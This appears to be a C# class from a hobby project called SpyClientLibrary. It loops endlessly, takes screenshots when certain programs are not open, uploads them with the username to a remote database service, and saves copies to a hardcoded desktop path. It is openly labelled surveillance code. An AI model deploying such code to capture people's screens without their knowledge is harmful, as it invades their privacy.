using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using SpyClientLibrary.ServiceReference;
using System.Drawing;


namespace SpyClientLibrary
{
    public class Control
    {
        public TaskManager _taskmanager { get; set; }
        public User _user { get; set; }
        public Control()
        {

        }
        public void StartControl()
        {
            _user = new User();
            _taskmanager = new TaskManager(1);
            while(true)
            {
                if (!_taskmanager.CheckOpenPrograms())
                {
                    ScreenShot screen = new ScreenShot(_user);
                    screen.GenerateCurrentScreen();
                    SendScreen(screen);
                }
            }
        }
        public void SendScreen(ScreenShot screen)
        {
            using (ClientServiceClient client = new ClientServiceClient())
            {                
                screen.GenerateCurrentScreen();
                var response = client.SaveScreenShotToDB(
                        new ClientRequest()
                        {
                            _username = screen._user._userName,
                            _scrrenDate = screen._scrrenDate,
                            _scrrenName = screen._screenName,
                            _data = screen._data
                        });
            }
            SaveScreenOnDisk(screen._data);
        }
        public Image GetLastScreenTest()
        {
            using (ClientServiceClient client = new ClientServiceClient())
            {
                var response = client.GetScreenFromDB();
                Image tosave =ScreenShot.byteArrayToImage(response);

                return tosave;
            }
        }
        public void SaveScreenOnDisk(byte[] screen)
        {
            Image tosave = ScreenShot.byteArrayToImage(screen);
            tosave.Save("C:\\Users\\Michał\\Desktop\\nowy.png");
        }
    }
}
